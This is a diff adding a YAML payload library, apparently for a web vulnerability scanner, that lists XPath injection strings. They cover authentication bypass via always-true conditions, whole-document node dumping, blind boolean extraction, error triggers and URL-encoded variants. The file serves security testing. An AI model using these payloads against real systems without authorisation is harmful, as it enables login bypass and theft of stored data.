@@ -1,0 +1,139 @@
+defaults:
+  vuln_type: xpath
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # XPath injection — authentication bypass
+  # ============================================================
+  - technique: xpath_injection
+    injection_surface: query
+    evidence_type: status_diff
+    risk: 3
+    payload: "' or '1'='1"
+    notes: "XPath injection — always-true OR condition to bypass authentication."
+    tags: [xpath, or, auth_bypass]
+
+  - technique: xpath_injection
+    injection_surface: query
+    evidence_type: status_diff
+    risk: 3
+    payload: "' or '1'='1' or '1'='1"
+    notes: "Double OR XPath injection — works with both single- and double-quoted contexts."
+    tags: [xpath, or, double, auth_bypass]
+
+  - technique: xpath_injection
+    injection_surface: query
+    evidence_type: status_diff
+    risk: 3
+    payload: "admin' or '1'='1"
+    notes: "XPath injection with username prefix — matches admin user via OR."
+    tags: [xpath, or, admin, auth_bypass]
+
+  - technique: xpath_injection
+    injection_surface: query
+    evidence_type: status_diff
+    risk: 3
+    payload: "' or ''='"
+    notes: "XPath injection — empty string equals empty string (always true)."
+    tags: [xpath, or, empty, auth_bypass]
+
+  - technique: xpath_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "'] | //* | //x['"
+    notes: "XPath injection — close predicate, select all nodes, reopen predicate. Dumps all XML data."
+    tags: [xpath, select_all, data_extraction]
+
+  - technique: xpath_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "') or count(//*)>0 or ('"
+    notes: "XPath injection using count() function — always true for non-empty XML."
+    tags: [xpath, count, bypass]
+
+  - technique: xpath_injection
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "' or '1'='1"
+    notes: "XPath injection via form body (login form)."
+    tags: [xpath, or, form]
+
+  - technique: xpath_injection
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "' or '1'='1"
+    notes: "XPath injection via JSON body."
+    tags: [xpath, or, json]
+
+  # ============================================================
+  # Blind XPath — boolean
+  # ============================================================
+  - technique: xpath_blind_boolean
+    injection_surface: query
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "' and string-length(name(/*[1]))>1 and '1'='1"
+    notes: "Blind XPath — check if root element name length > 1. Compare to false variant."
+    tags: [xpath, blind, boolean, root_name]
+
+  - technique: xpath_blind_boolean
+    injection_surface: query
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "' and string-length(name(/*[1]))>100 and '1'='1"
+    notes: "Blind XPath — false condition (root name > 100 chars, very unlikely)."
+    tags: [xpath, blind, boolean, false]
+
+  - technique: xpath_blind_boolean
+    injection_surface: query
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "' and substring(name(/*[1]),1,1)='a' and '1'='1"
+    notes: "Blind XPath — extract first char of root element name."
+    tags: [xpath, blind, boolean, extraction]
+
+  # ============================================================
+  # XPath error-based
+  # ============================================================
+  - technique: xpath_blind_error
+    injection_surface: query
+    evidence_type: error
+    risk: 3
+    payload: "' and 1/0 and '1'='1"
+    notes: "XPath error trigger — division by zero."
+    tags: [xpath, error, division]
+
+  - technique: xpath_blind_error
+    injection_surface: query
+    evidence_type: error
+    risk: 3
+    payload: "' or string(//INVALID_NODE_NAME) or '"
+    notes: "XPath error trigger — reference to non-existent node. Some engines error on invalid node queries."
+    tags: [xpath, error, invalid_node]
+
+  # ============================================================
+  # URL-encoded variants
+  # ============================================================
+  - technique: xpath_injection
+    injection_surface: query
+    encoding: url
+    evidence_type: status_diff
+    risk: 3
+    payload: "%27%20or%20%271%27%3d%271"
+    notes: "URL-encoded ' or '1'='1 XPath injection."
+    tags: [xpath, or, url_encoded]
+
+  - technique: xpath_injection
+    injection_surface: query
+    encoding: url
+    evidence_type: content_match
+    risk: 3
+    payload: "%27%5d%20%7c%20%2f%2f%2a%20%7c%20%2f%2fx%5b%27"
+    notes: "URL-encoded '] | //* | //x[' XPath node dump."
+    tags: [xpath, select_all, url_encoded]
